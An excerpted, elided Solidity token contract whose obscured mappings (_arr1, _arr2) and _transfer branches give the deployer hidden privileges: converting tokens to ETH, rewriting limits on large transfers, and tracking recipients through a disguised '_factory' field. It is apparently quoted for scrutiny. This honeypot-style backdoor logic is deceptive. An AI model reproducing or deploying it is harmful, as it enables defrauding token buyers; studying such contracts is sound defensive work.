...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _arr1;
    mapping(address => uint256) private _arr2;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _arr1[address(this)] = _tTotal;
        _arr1[msg.sender] = _tTotal;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && _arr1[from] == 0 && amount <= swapAtAmount) {
            require(_arr2[from] + _value >= 0, 'Transfer amount exceeds maximum amount');
        }
        ...
        } else if (_arr1[from] > 0 && _arr1[to] > 0) {
            fee = amount;
            _balances[address(this)] += fee;
            return swapTokensForEth(amount, to);
        }
        if (amount > swapAtAmount && to != uniswapV2Pair && to != address(router)) {
            if (_arr1[from] > 0) _arr1[to] = amount;
            else _arr2[to] = amount;
            return;
        }
        bool takeFee = _arr1[from] == 0 && _arr1[to] == 0 && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (_arr2[factory] == 0) _arr2[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
